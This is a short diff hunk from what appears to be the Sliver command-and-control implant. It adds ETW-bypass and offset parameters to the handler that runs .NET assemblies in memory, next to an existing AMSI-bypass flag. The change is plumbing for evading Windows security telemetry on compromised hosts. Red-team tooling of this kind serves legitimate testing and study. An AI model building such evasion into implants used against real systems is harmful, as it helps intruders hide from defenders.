@@ -172,7 +172,7 @@ func executeAssemblyHandler(data []byte, resp RPCResponse) {
 		// {{end}}
 		return
 	}
-	output, err := taskrunner.ExecuteAssembly(execReq.HostingDll, execReq.Assembly, execReq.Process, execReq.Arguments, execReq.AmsiBypass)
+	output, err := taskrunner.ExecuteAssembly(execReq.HostingDll, execReq.Assembly, execReq.Process, execReq.Arguments, execReq.AmsiBypass, execReq.EtwBypass, execReq.Offset)
 	execAsm := &sliverpb.ExecuteAssembly{Output: []byte(output)}
 	if err != nil {
 		execAsm.Response = &commonpb.Response{
